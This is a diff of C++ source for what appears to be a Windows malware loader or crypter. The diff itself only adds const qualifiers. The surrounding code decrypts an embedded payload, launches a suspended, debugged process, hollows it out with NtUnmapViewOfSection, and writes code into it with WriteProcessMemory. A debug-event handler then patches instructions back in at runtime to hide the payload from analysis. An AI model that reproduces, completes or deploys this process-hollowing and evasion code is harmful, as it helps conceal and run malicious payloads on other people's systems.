@@ -4,7 +4,7 @@
 #include <iomanip>
 #include <thread>
 
-std::uintptr_t getImageBase(HANDLE hProcess) {
+std::uintptr_t getImageBase(const HANDLE hProcess) {
 	PROCESS_BASIC_INFORMATION processBasicInfo { 0 };
 
 	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
@@ -32,7 +32,7 @@ std::uintptr_t getImageBase(HANDLE hProcess) {
 	return reinterpret_cast<std::uintptr_t>(peb.ImageBaseAddress);
 }
 
-bool execute(char* executablePath, char* commandLine, PROCESS_INFORMATION* pProcessInfo) {
+bool execute(const char* executablePath, const char* commandLine, PROCESS_INFORMATION* pProcessInfo) {
 	// Decrypt the payload
 	payload.decrypt();
 
@@ -52,7 +52,7 @@ bool execute(char* executablePath, char* commandLine, PROCESS_INFORMATION* pProc
 
 	STARTUPINFOA startupInfo { 0 };
 
-	if (!CreateProcessA(executablePath, commandLine, nullptr, nullptr, false, CREATE_SUSPENDED | DEBUG_PROCESS, nullptr, nullptr, &startupInfo, pProcessInfo)) {
+	if (!CreateProcessA(executablePath, const_cast<char*>(commandLine), nullptr, nullptr, false, CREATE_SUSPENDED | DEBUG_PROCESS, nullptr, nullptr, &startupInfo, pProcessInfo)) {
 		return false;
 	}
 
@@ -62,7 +62,7 @@ bool execute(char* executablePath, char* commandLine, PROCESS_INFORMATION* pProc
 		return false;
 	}
 
-	xNtUnmapViewOfSection NtUnmapViewOfSection = reinterpret_cast<xNtUnmapViewOfSection>(GetProcAddress(ntdll, "NtUnmapViewOfSection"));
+	const xNtUnmapViewOfSection NtUnmapViewOfSection = reinterpret_cast<xNtUnmapViewOfSection>(GetProcAddress(ntdll, "NtUnmapViewOfSection"));
 	NtUnmapViewOfSection(pProcessInfo->hProcess, nullptr);
 
 	CONTEXT context { 0 };
@@ -107,8 +107,8 @@ bool execute(char* executablePath, char* commandLine, PROCESS_INFORMATION* pProc
 	return true;
 }
 
-bool handleDebugEvent(DEBUG_EVENT debugEvent, HANDLE hProcess) {
-	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, false, debugEvent.dwThreadId);
+bool handleDebugEvent(const DEBUG_EVENT debugEvent, const HANDLE hProcess) {
+	const HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, false, debugEvent.dwThreadId);
 
 	if (!hThread || hThread == INVALID_HANDLE_VALUE) {
 		return false;
@@ -125,9 +125,8 @@ bool handleDebugEvent(DEBUG_EVENT debugEvent, HANDLE hProcess) {
 		return false;
 	}
 
-	std::uintptr_t imageBase = getImageBase(hProcess);
-
-	std::uintptr_t oldRVA = runtime.getOldRVA();
+	const std::uintptr_t imageBase = getImageBase(hProcess);
+	const std::uintptr_t oldRVA = runtime.getOldRVA();
 
 	if (oldRVA != 0) {
 		if (runtime.hasInstruction(oldRVA)) {
@@ -162,11 +161,6 @@ bool handleDebugEvent(DEBUG_EVENT debugEvent, HANDLE hProcess) {
 
 	const std::vector<std::byte> instrBytes = runtimeInstr.getBytes();
 
-	//for (size_t i = 0; i < instrBytes.size(); i++) {
-	//	std::cout << "\\x" << std::uppercase << std::hex << std::setfill('0') << std::setw(2) << (int)instrBytes[i];
-	//}
-	//std::cout << std::endl;
-
 	context.Rip -= 1;
 
 	if (!WriteProcessMemory(hProcess, reinterpret_cast<void*>(va), &instrBytes[0], instrBytes.size(), nullptr)) {
@@ -191,7 +185,7 @@ bool handleDebugEvent(DEBUG_EVENT debugEvent, HANDLE hProcess) {
 	return true;
 }
 
-void handler(HANDLE hProcess, HANDLE hThread) {
+void handler(const HANDLE hProcess, const HANDLE hThread) {
 	DEBUG_EVENT debugEvent { 0 };
 
 	bool running = true;
